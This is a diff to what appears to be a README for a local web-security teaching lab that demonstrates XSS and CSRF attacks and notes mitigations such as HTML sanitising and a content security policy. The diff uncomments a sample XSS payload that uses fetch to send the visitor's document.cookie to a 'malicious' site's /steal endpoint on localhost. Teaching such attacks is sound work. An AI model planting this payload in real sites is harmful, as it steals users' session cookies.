@@ -17,20 +17,18 @@ node xss/vulnerable-app.js
 Start the malicious website ([http://localhost:3001/](http://localhost:3001/)):
 
 ```bash
-node xss/vulnerable-app.js
+node xss/malicious-app.js
 ```
 
 The attacker connects to the vulnerable website and edit the content of the HTML.
 For instance, the following XSS injection sends the cookie of the user that visit the vulnerable website to a malicious website:
 
 ```html
-<!-- Sample XSS injection
 <script>
     fetch("http://localhost:3001/steal?cookie=" + document.cookie)
         .then(response => response.text())
         .then(text => alert("Your secret has been stolen: " + text));
 </script>
--->
 ```
 
 This kind of attack can be mitigated by using an HTML sanitizer and by configuring a content security policy (CSP) in the headers of the HTTP response.
@@ -47,7 +45,7 @@ node csrf/vulnerable-app.js
 Start the malicious website ([http://localhost:3001/](http://localhost:3001/)):
 
 ```bash
-node csrf/vulnerable-app.js
+node csrf/malicious-app.js
 ```
 
 The attacker sends an email or a message to the user that contains a link to the malicious website.
